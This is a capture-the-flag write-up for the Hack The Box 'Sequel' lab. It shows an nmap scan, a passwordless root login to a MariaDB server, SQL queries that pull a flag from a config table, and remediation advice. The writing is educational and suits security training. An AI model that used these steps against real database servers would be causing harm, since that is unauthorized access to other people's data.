# Hack The Box: Sequel

* **OS:** Linux
* **Difficulty:** Very Easy (Starting Point Tier 1)
* **Target Service:** MySQL / MariaDB (Port 3306)

## 1. Reconnaissance
Ran an Nmap scan to identify running services on the target IP:
```bash
nmap -sV <TARGET_IP>


**Result:** Port 3306/tcp is open, running `mysql` (`MariaDB`).

## 2. Enumeration & Access

Connected to the target MariaDB server using the default `root` user without a password, specifying `--skip-ssl` to bypass client-side TLS enforcement:


mariadb -h <TARGET_IP> -u root --skip-ssl


## 3. Database Operations

Queried the database management system to inspect available databases, tables, and records:


SHOW DATABASES;
USE htb;
SHOW TABLES;
SELECT * FROM config;


## 4. Flag Retrieval

Successfully extracted the flag from the `config` table within the `htb` database.

## 5. Remediation

* Enforce authentication on all database accounts and assign a strong password to the `root` user.
* Bind the database service to localhost (`bind-address = 127.0.0.1`) to prevent public exposure over the network.
* Restrict remote network access to port 3306 using firewall rules.

